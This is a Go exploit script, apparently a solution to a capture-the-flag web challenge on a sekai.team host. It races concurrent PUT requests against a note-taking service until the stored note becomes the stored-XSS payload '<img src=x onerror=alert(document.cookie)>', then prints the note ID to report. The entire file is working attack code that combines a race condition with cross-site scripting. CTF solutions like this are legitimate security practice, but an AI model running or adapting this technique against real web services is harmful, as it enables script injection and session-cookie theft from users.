package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

const (
	baseURL = "https://ltw.chals.sekai.team"
)

// post to /create
func createNote(message string) (string, error) {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.PostForm(baseURL+"/create", url.Values{"message": {message}})
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to create note: %s", string(body))
	}

	location := resp.Header.Get("Location")
	id := strings.TrimPrefix(location, "/notes/")
	return id, nil
}

// put to /notes/{id}
func updateNote(id, message string) error {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	form := url.Values{"message": {message}}
	req, err := http.NewRequest("PUT", fmt.Sprintf("%s/notes/%s", baseURL, id), strings.NewReader(form.Encode()))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to update note: %s", string(body))
	}

	return nil
}

// get to /notes/{id}
func getNote(id string) (string, error) {
	resp, err := http.Get(fmt.Sprintf("%s/notes/%s", baseURL, id))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to get note: %s", string(body))
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	payload := "<img src=x onerror=alert(document.cookie)>"
	p1 := "<"
	p2 := "*" + payload[1:]

	id, err := createNote("foo")
	if err != nil {
		fmt.Println("create error:", err)
		return
	}

	for {
		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			err := updateNote(id, p2)
			if err != nil {
				fmt.Println("update error:", err)
				return
			}
		}()

		go func() {
			defer wg.Done()
			err := updateNote(id, p1)
			if err != nil {
				fmt.Println("update error:", err)
				return
			}
		}()

		wg.Wait()

		content, err := getNote(id)
		fmt.Println("now:", content)
		if err != nil {
			fmt.Println("get error:", err)
			return
		}

		if content == payload {
			fmt.Println("pwned!", content)
			fmt.Println("Report this ID:", id)
			fmt.Println("URL:", fmt.Sprintf("%s/notes/%s", baseURL, id))
			return
		}

		time.Sleep(50 * time.Millisecond)
	}
}
